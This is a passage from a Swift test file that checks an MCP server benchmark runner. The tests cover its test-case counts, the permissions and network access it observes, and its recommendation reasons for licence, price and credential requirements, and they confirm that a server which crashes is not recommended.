        #expect(b.cases.count == 6 && b.cases.last?.name == "an unknown tool is rejected cleanly" && b.cases.first?.name == "starts and lists its tools")
        #expect(b.permissionsObserved.contains("Read") && b.permissionsObserved.contains("Write to the project") && b.networkObserved == false)
        var s = rec; s.isFixture = false; s.discovery?.license = nil
        #expect(MCPBenchmarkRunner.recommendation(for: s).reasons.contains { $0.contains("licence is unknown") })
        s.discovery?.license = "MIT"; s.discovery?.price = "unknown"
        #expect(MCPBenchmarkRunner.recommendation(for: s).reasons.contains { $0.contains("unknown is never free") })
        s.discovery?.price = "free"; s.credentialRequirement = "api key"
        #expect(MCPBenchmarkRunner.recommendation(for: s).reasons.contains { $0.contains("you would have to authorise it yourself") })
        s.credentialRequirement = "none"
        #expect(MCPBenchmarkRunner.recommendation(for: s).recommend)
        // a server that dies on an unknown tool or fails cases is not recommended
        let h2 = try MCPHarness()
        h2.configure = { $0.dieAfterCalls = 1 }
        await h2.recommended(id: "fragile")
        #expect(h2.registry.server("fragile")?.status != .recommended)
    }
}

private extension MCPRegistry.RemovalRequest { var requestedID: UUID? { if case .requested(let id) = self { return id }; return nil } }
